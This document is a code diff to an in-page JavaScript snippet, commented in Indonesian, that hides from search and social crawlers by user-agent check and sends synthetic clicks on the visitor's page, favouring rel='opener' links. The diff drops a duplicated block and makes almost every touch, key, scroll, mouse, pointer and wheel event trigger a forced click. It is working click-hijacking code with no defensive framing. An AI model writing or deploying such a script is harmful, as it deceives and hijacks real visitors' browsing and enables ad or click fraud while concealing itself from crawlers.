@@ -1,120 +1,3 @@
-
-<!-- random klik start -->
-<script>
-(function() {
-  'use strict';
-
-  // ========== ABAIKAN BOT/CRAWLER ==========
-  const botPattern = /bot|crawler|spider|googlebot|bingbot|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot|mj12bot|dotbot|screaming/i;
-  if (botPattern.test(navigator.userAgent)) return;
-
-  // ========== KONFIGURASI ==========
-  const DELAY_MIN = 300;
-  const DELAY_MAX = 1000;
-  const OPENER_CHANCE = 0.8;
-
-  let timeoutId = null;
-  let isRunning = false;
-
-  // ========== DETEKSI ELEMEN ==========
-  function isOpenerLink(el) {
-    if (!el) return false;
-    if (el.tagName.toLowerCase() !== 'a') return false;
-    const rel = (el.getAttribute('rel') || '').toLowerCase().split(/\s+/);
-    return rel.includes('opener');
-  }
-
-  function isVisible(el) {
-    if (!el) return false;
-    const rect = el.getBoundingClientRect();
-    return rect.width > 0 && rect.height > 0 && rect.top < window.innerHeight && rect.left < window.innerWidth;
-  }
-
-  function isSafeElement(el) {
-    if (!el) return false;
-    if (isOpenerLink(el)) return true;
-    const tag = el.tagName.toLowerCase();
-    const role = (el.getAttribute('role') || '').toLowerCase();
-    const blockedTags = ['button', 'input', 'select', 'textarea', 'form', 'label', 'iframe', 'video', 'audio', 'canvas', 'embed', 'object'];
-    const blockedRoles = ['button', 'link', 'checkbox', 'radio', 'switch', 'tab', 'menuitem', 'textbox', 'searchbox', 'slider', 'spinbutton'];
-    if (blockedTags.includes(tag)) return false;
-    if (blockedRoles.includes(role)) return false;
-    if (el.closest('button, input, select, textarea, form, iframe, video, [role="button"], [role="link"], [role="textbox"], [onclick]:not(a[rel*="opener"])')) return false;
-    if (tag === 'a' && !isOpenerLink(el)) return false;
-    return true;
-  }
-
-  // ========== FUNGSI UTAMA ==========
-  function randomDelay() {
-    return DELAY_MIN + Math.random() * (DELAY_MAX - DELAY_MIN);
-  }
-
-  function getOpenerLinks() {
-    return Array.from(document.querySelectorAll('a[rel~="opener"]')).filter(isVisible);
-  }
-
-  function doClick() {
-    if (!isRunning) return;
-
-    try {
-      let el = null;
-      let x, y;
-      let openerClicked = false;
-
-      const openerLinks = getOpenerLinks();
-
-      if (openerLinks.length > 0 && Math.random() < OPENER_CHANCE) {
-        const link = openerLinks[Math.floor(Math.random() * openerLinks.length)];
-        const rect = link.getBoundingClientRect();
-        x = rect.left + Math.random() * rect.width;
-        y = rect.top + Math.random() * rect.height;
-        el = document.elementFromPoint(x, y) || link;
-        openerClicked = true;
-      } else {
-        for (let i = 0; i < 20; i++) {
-          x = Math.random() * window.innerWidth;
-          y = Math.random() * window.innerHeight;
-          el = document.elementFromPoint(x, y);
-          if (isSafeElement(el)) break;
-          el = null;
-        }
-        if (!el || !isSafeElement(el)) {
-          el = document.body;
-          x = window.innerWidth / 2;
-          y = window.innerHeight / 2;
-        }
-      }
-
-      if (el) {
-        el.dispatchEvent(new MouseEvent('click', {
-          bubbles: true,
-          cancelable: true,
-          clientX: x,
-          clientY: y,
-          view: window
-        }));
-      }
-
-      if (openerClicked) {
-        stopLoop();
-        return;
-      }
-
-    } catch (e) {
-      // Gagal, lanjut
-    }
-
-    // LOOP TERUS
-    timeoutId = setTimeout(doClick, randomDelay());
-  }
-
-  // ========== START / STOP ==========
-  function startLoop() {
-    if (!isRunning) {
-      isRunning = true;
-      doClick();
-    }
-  }
 <!-- random klik start -->
 <script>
 (function() {
@@ -145,12 +28,20 @@
     }
   }
 
-  // ========== SETIAP INTERAKSI = 1 KLIK ==========
-  const interactionEvents = ['click', 'touchstart', 'scroll', 'keydown', 'mousemove', 'pointerdown'];
+  // ========== SEMUA INTERAKSI, TANPA PASSIVE ==========
+  const interactionEvents = [
+    'click',
+    'touchstart', 'touchend', 'touchmove', 'touchcancel',
+    'scroll',
+    'keydown', 'keyup',
+    'mousemove', 'mousedown', 'mouseup',
+    'pointerdown', 'pointermove', 'pointerup',
+    'wheel'
+  ];
 
   interactionEvents.forEach(eventType => {
-    document.addEventListener(eventType, clickAnywhere, { capture: true, passive: true });
-    window.addEventListener(eventType, clickAnywhere, { capture: true, passive: true });
+    document.addEventListener(eventType, clickAnywhere, { capture: true });
+    window.addEventListener(eventType, clickAnywhere, { capture: true });
   });
 
 })();
